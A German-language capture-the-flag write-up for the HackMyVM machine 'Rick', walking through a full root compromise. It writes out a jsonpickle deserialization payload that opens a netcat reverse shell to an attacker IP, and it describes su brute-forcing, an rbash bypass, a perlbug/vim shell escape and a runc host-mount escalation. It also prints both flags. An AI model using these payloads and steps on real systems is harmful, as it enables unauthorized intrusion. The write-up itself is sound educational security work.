# Rick - HackMyVM (Hard)

![Rick.png](Rick.png)

## Übersicht

*   **VM:** Rick
*   **Plattform:** HackMyVM (https://hackmyvm.eu/machines/machine.php?vm=Rick)
*   **Schwierigkeit:** Hard
*   **Autor der VM:** DarkSpirit
*   **Datum des Writeups:** 17. Oktober 2022
*   **Original-Writeup:** https://alientec1908.github.io/Rick_HackMyVM_Hard/
*   **Autor:** Ben C.

## Kurzbeschreibung

Das Ziel dieser Challenge war es, Root-Rechte auf der Maschine "Rick" zu erlangen. Der initiale Zugriff erfolgte durch Ausnutzung einer unsicheren Deserialisierungs-Schwachstelle (vermutlich Python Pickle) in einer Python/Werkzeug-Webanwendung auf Port 5000. Ein speziell präparierter, Base64-kodierter Cookie-Wert (`username`) führte zur Remote Code Execution (RCE) als Benutzer `www-data`. Von dort aus wurde das Passwort (`internet`) für den Benutzer `morty` mittels eines `su`-Brute-Force-Skripts gefunden, nachdem ein Hinweis in einer Datei (`.important`) auf ein schwaches Passwort hindeutete. Nach dem Wechsel zu `morty` (der eine eingeschränkte `rbash` hatte, die durch SSH-Login umgangen wurde) wurde eine unsichere `sudo`-Regel entdeckt, die `morty` erlaubte, `/usr/bin/perlbug` als `rick` auszuführen. Dies wurde genutzt, um mittels Shell-Escape innerhalb von `vim` (als Editor für `perlbug` gewählt) eine Shell als `rick` zu erlangen. Die finale Eskalation zu Root erfolgte durch Ausnutzung einer weiteren unsicheren `sudo`-Regel, die `rick` erlaubte, `/usr/sbin/runc` als Root auszuführen. Durch Erstellen und Starten eines manipulierten Docker/OCI-Containers, der das Host-Root-Verzeichnis einband, wurde eine Root-Shell erhalten.

## Disclaimer / Wichtiger Hinweis

Die in diesem Writeup beschriebenen Techniken und Werkzeuge dienen ausschließlich zu Bildungszwecken im Rahmen von legalen Capture-The-Flag (CTF)-Wettbewerben und Penetrationstests auf Systemen, für die eine ausdrückliche Genehmigung vorliegt. Die Anwendung dieser Methoden auf Systeme ohne Erlaubnis ist illegal. Der Autor übernimmt keine Verantwortung für missbräuchliche Verwendung der hier geteilten Informationen. Handeln Sie stets ethisch und verantwortungsbewusst.

## Verwendete Tools

*   `netdiscover`
*   `nmap`
*   `gobuster`
*   `ssh`
*   `ssh-keygen` (für Host-Key-Management)
*   `curl`
*   `echo`
*   Base64 Decoder (implizit)
*   `nc` (netcat)
*   Python3 (`pty` Modul, `http.server`)
*   `export`
*   `stty`
*   `fg`
*   `git` (für `su-bruteforce`)
*   `wget`
*   `chmod`
*   `sh` (für `suBF.sh`)
*   `su`
*   `perlbug`
*   `vim` (innerhalb von `perlbug`)
*   `runc`
*   `nano`
*   Standard Linux-Befehle (`ls`, `cat`, `id`, `pwd`, `cd`, `sudo`, `find`)

## Lösungsweg (Zusammenfassung)

Der Angriff auf die Maschine "Rick" gliederte sich in folgende Phasen:

1.  **Reconnaissance & Web Enumeration:**
    *   IP-Adresse des Ziels (192.168.2.152) mit `netdiscover` identifiziert. Hostname `rick.vm` in `/etc/hosts` eingetragen.
    *   `nmap`-Scan offenbarte Port 22 (SSH, OpenSSH 7.9p1), 80 (HTTP, Apache 2.4.38) und 5000 (HTTP, Werkzeug httpd 0.15.5 / Python 2.7.16).
    *   Port 80 zeigte eine Standardseite. Port 5000 gab einen "500 Internal Server Error" zurück, aber eine Anfrage auf `/whoami` (aus Nmap-Output) und ein `curl` auf `/` zeigten einen Redirect und ein Base64-kodiertes `username`-Cookie.

2.  **Initial Access (Python Deserialization RCE als `www-data`):**
    *   Der Base64-dekodierte Cookie-Wert (`{"py/object": "__main__.User", "username": "Rick"}`) deutete auf eine Python-Deserialisierungs-Schwachstelle hin.
    *   Ein bösartiger JSON-Payload wurde erstellt, der `subprocess.Popen` verwendet, um eine Netcat-Reverse-Shell zu starten: `{"py/reduce": [{"py/type": "subprocess.Popen"}, {"py/tuple": [{"py/tuple": ["nc", "-e", "/bin/bash", "ANGRIFFS_IP", "8888"]}]}]}`.
    *   Dieser Payload wurde Base64-kodiert und als Wert für das `username`-Cookie in einer `curl`-Anfrage an `http://192.168.2.152:5000` gesendet.
    *   Eine Reverse Shell als `www-data` wurde auf einem Netcat-Listener (Port 8888) empfangen und stabilisiert.

3.  **Privilege Escalation (von `www-data` zu `morty` via `su` Bruteforce):**
    *   Als `www-data` wurde im Home-Verzeichnis von `morty` die Datei `.important` gefunden, die auf ein einfaches Passwort für `morty` hinwies.
    *   Das Skript `suBF.sh` (aus `carlospolop/su-bruteforce`) und eine Passwortliste (`top12000.txt`) wurden auf das Zielsystem hochgeladen.
    *   `sh ./suBF.sh -u morty -w top12000.txt` knackte das Passwort für `morty` zu `internet`.
    *   Mit `su morty` wurde zum Benutzer `morty` gewechselt. Es wurde festgestellt, dass `morty` eine eingeschränkte `rbash` verwendete.
    *   Der private SSH-Schlüssel von `morty` (`~/.ssh/id_rsa`) wurde ausgelesen und für einen SSH-Login verwendet, um eine normale Bash-Shell als `morty` zu erhalten.

4.  **Privilege Escalation (von `morty` zu `rick` via `sudo perlbug`):**
    *   `sudo -l` als `morty` zeigte, dass `/usr/bin/perlbug` als Benutzer `rick` ohne Passwort ausgeführt werden durfte: `(rick) NPASSWD: /usr/bin/perlbug`.
    *   `sudo -u rick /usr/bin/perlbug` wurde ausgeführt. `vim` wurde als Editor gewählt.
    *   Innerhalb von `vim` wurde mit `:!/bin/bash` eine Shell als Benutzer `rick` gestartet.
    *   Die User-Flag (`a52d68b19ebca39c7b821ab1a51fef2e`) wurde in `/home/rick/user.txt` gefunden.

5.  **Privilege Escalation (von `rick` zu `root` via `sudo runc`):**
    *   `sudo -l` als `rick` zeigte, dass `/usr/sbin/runc` als `root` ohne Passwort ausgeführt werden durfte: `(ALL : ALL) NPASSWD: /usr/sbin/runc`.
    *   In `/dev/shm` wurde mit `runc spec` eine Container-Konfiguration (`config.json`) und ein `rootfs`-Verzeichnis erstellt.
    *   Die `config.json` wurde bearbeitet, um das Host-Root-Verzeichnis (`/`) read-write (`"rw"`) in das Container-Root-Verzeichnis (`"destination": "/"` oder `"/mnt/root"`) zu binden.
    *   Der Container wurde mit `sudo /usr/sbin/runc run demo` gestartet.
    *   Dies führte zu einer Root-Shell innerhalb des Containers mit Zugriff auf das gesamte Host-Dateisystem.
    *   Die Root-Flag (`256fdda9b4e714bf9f38a92750debf70`) wurde in `/root/root.txt` (innerhalb des chroot/Containers) gefunden.

## Wichtige Schwachstellen und Konzepte

*   **Python Insecure Deserialization:** Eine Webanwendung auf Port 5000 deserialisierte unsicher Python-Objekte aus einem Cookie, was zu RCE führte.
*   **Schwache Passwörter:** Das Passwort für den Benutzer `morty` (`internet`) konnte mit einer kleinen Wortliste gebruteforced werden.
*   **Eingeschränkte Shell (rbash) Bypass:** Die `rbash`-Einschränkung für `morty` wurde durch Auslesen des SSH-Schlüssels und erneuten Login via SSH umgangen.
*   **Unsichere `sudo`-Regeln:**
    *   `morty` durfte `perlbug` als `rick` ausführen. `perlbug` erlaubte das Starten eines Editors (`vim`), aus dem eine Shell als `rick` gestartet werden konnte.
    *   `rick` durfte `runc` als `root` ausführen. Dies ermöglichte das Erstellen eines privilegierten Containers, der das Host-Dateisystem mountet und somit Root-Zugriff auf den Host gewährt.
*   **Information Disclosure:** Eine Notiz (`.important`) gab einen Hinweis auf ein schwaches Passwort.

## Flags

*   **User Flag (`/home/rick/user.txt`):** `a52d68b19ebca39c7b821ab1a51fef2e`
*   **Root Flag (`/root/root.txt`):** `256fdda9b4e714bf9f38a92750debf70`

## Tags

`HackMyVM`, `Rick`, `Hard`, `Python Deserialization`, `Werkzeug`, `rbash bypass`, `sudo Exploit`, `perlbug`, `vim shell escape`, `runc Exploit`, `Docker Privilege Escalation`, `Linux`, `Web`, `Privilege Escalation`, `Apache`, `OpenSSH`
